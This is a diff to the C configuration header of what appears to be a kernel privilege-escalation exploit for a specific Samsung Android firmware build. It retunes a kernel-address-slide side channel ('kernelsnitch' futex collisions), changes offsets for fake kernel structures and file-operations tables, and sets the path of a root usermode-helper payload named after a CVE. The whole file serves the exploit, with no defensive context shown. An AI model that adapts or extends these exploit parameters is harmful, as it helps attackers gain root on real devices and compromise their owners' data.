@@ -6,7 +6,7 @@
  * ------------------------------------------------------------------------- */
 #define BUILD_VARIANT_LABEL "a35x-A356EXXU5CYI8-app"
 #define PHYS_P0_ORACLE 1
-#define SLIDE_ROUTE SLIDE_ROUTE_MCAST
+#define SLIDE_ROUTE SLIDE_ROUTE_FPSIMD
 
 #ifndef BUILD_FINGERPRINT
 #define BUILD_FINGERPRINT \
@@ -95,8 +95,12 @@
 
 /* --- slide kernelsnitch tuning ------------------------------------------- */
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 24
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 48
 #define SLIDE_KSNITCH_AVERAGE 4
+#define SLIDE_KSNITCH_SCREEN_REPEAT 16
+#define SLIDE_KSNITCH_SCREEN_AVERAGE 3
+#define KSNITCH_FULL_COLLISIONS 4
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 2
 
 /* --- controlled-mm bank layout ------------------------------------------- */
 #define SLIDE_BANK_SLOTS 4
@@ -121,8 +125,8 @@
 #define FAKE_TASK_TASK_GROUP_OFF  0x400ULL
 
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define ROOT_UMH_WORK_OFF 0x6000
-#define ROOT_UMH_DATA_OFF 0x6200
+#define ROOT_UMH_WORK_OFF 0x7800
+#define ROOT_UMH_DATA_OFF 0x7a00
 
 /* ---------------------------------------------------------------------------
  * Static kernel symbol offsets (text-relative)
@@ -206,7 +210,7 @@
  * ------------------------------------------------------------------------- */
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
+#define FOPS_OFF 0x7000
 #define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
